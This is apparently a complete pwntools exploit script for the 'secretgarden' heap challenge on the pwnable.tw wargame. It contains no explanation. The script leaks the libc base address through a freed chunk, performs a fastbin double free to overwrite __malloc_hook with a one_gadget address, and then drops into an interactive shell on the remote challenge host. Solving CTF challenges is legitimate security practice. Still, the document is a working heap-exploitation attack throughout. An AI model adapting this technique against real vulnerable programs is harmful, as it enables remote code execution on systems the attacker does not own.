from pwn import *
import subprocess
context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
context.os = "linux"
# context.log_level = "debug"

def get_text_base(pid):
    cmd = f"cat /proc/{pid}/maps" + " | head -1 | awk -F- '{print $1}'"
    return int(subprocess.check_output(cmd,shell=True),16)
def get_libc_base(pid):
    cmd = f"cat /proc/{pid}/maps" + " | grep libc | head -1 | awk -F- '{print $1}'"
    return int(subprocess.check_output(cmd,shell=True),16)

def gdb_script(pid,*brks):
    base = get_text_base(pid)
    cmd = f"set $base={base}\n"
    for b in brks:
        cmd+= f"b *{b+base}\n"
    return cmd
    
def choice(io,ch):
    io.sendafter(b"Your choice : ", ch)

def add(io,length,name,color):
    choice(io,b'1')
    io.sendlineafter(b'Length of the name :', str(length).encode())
    io.sendafter(b"The name of flower :", name)
    io.sendlineafter(b"The color of the flower :", color)

def remove(io,idx):
    choice(io,b"3")
    io.sendlineafter(b"Which flower do you want to remove from the garden:",str(idx))

def clean(io):
    choice(io,b'4')

def visit(io):
    choice(io,b"2")


def leak_libc(io):
    add(io,0x100,b"a",b"a")
    add(io,40,b"a",b"a")
    add(io,0x100,b"a",b"a")

    remove(io,0)
    remove(io,1)

    add(io,0x100,b"a",b"a")
    visit(io)
    io.recvuntil(b"Name of the flower[3] :")
    tmp = (u64(io.recv(6).ljust(8,b"\0")) >> 12) << 12 
    return tmp-0x3c3000


def double_free_fastbin(io,libc):
    add(io, 0x60, b"a",b"a")    # 4
    add(io, 0x60, b"a",b"a")    # 5
    add(io, 0x60, b"a",b"a")    # 6
    remove(io, 4)
    remove(io, 5)
    remove(io, 4)
    fake_chunk_address = libc.symbols['__malloc_hook']-0x20+0x5-0x8
    one_gadget = libc.address+0xef6c4
    add(io, 0x60, p64(fake_chunk_address), b"a")
    add(io, 0x60, p64(one_gadget), b"a")
    add(io, 0x60, p64(one_gadget), b"a")
    payload = b"a"*(libc.symbols["__malloc_hook"]-(fake_chunk_address+0x10)) +p64(one_gadget)
    print(payload)
    add(io, 0x60, payload, b"a")
    remove(io,4)
    remove(io,4)


DEBUG = False
if __name__=="__main__":
    if DEBUG:
        io = process("./secretgarden")
        pid = pidof(io)[0]
    else:
        io = remote("chall.pwnable.tw",10203)
    libc = ELF("./libc_64.so.6")
    libc.address = leak_libc(io)
    success(f"Leaked libc at: {hex(libc.address)}")
    double_free_fastbin(io,libc)
    # gdb.attach(io,gdbscript = gdb_script(pid))
    # sleep(1)
    # add(io, 0x50, b"a", b"a")
    io.interactive()

    
